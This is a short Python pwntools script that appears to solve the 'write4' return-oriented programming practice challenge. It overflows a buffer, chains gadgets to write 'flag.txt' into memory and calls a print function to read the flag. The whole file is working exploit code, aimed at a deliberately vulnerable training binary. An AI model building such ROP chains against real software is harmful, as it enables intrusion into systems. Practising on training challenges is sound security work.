from pwn import *
r = process("./write4")
elf = ELF("write4")
pop_r14_r15 = p64(0x0000000000400690)
ptr_r14 = p64(0x0000000000400628) #mov qword ptr [r14], r15 ; ret
bss = elf.bss()
pop_rdi = p64(0x0000000000400693)
print_file = p64(0x0000000000400510)

payload = b"\x90"*40 + pop_r14_r15 + p64(bss) + b"flag.txt" + ptr_r14 + pop_rdi + p64(bss) + print_file

r.write(payload)

r.interactive()
